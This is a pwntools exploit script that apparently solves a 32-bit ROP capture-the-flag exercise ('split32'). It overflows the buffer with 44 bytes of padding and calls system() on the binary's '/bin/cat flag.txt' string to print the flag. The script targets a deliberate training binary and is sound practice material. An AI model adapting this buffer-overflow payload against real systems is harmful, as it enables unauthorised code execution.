from pwn import *

# This will automatically get context arch, bits, os etc
elf = context.binary = ELF('./split32', checksec=False)
p = process()

# How many bytes to EIP?
padding = 44

# Locate the functions/strings we need
system_addr = elf.symbols['system']
bincat_addr = next(elf.search(b'/bin/cat'))

# Print out the target address
info("%#x system", system_addr)
info("%#x /bin/cat", bincat_addr)

payload = flat(
    asm('nop') * padding,  # Padding to EIP
    elf.symbols['system'],  # system function - 0xf7dfefa0
    0x0,  # Return pointer
    bincat_addr,  # /bin/cat flag.txt address (found using search in pwndbg)
)

# Save payload to file
f = open("payload", "wb")
f.write(payload)

# PWN
p.sendlineafter('>', payload)
p.recvuntil('Thank you!\n')

# Get our flag!
flag = p.recv()
success(flag)
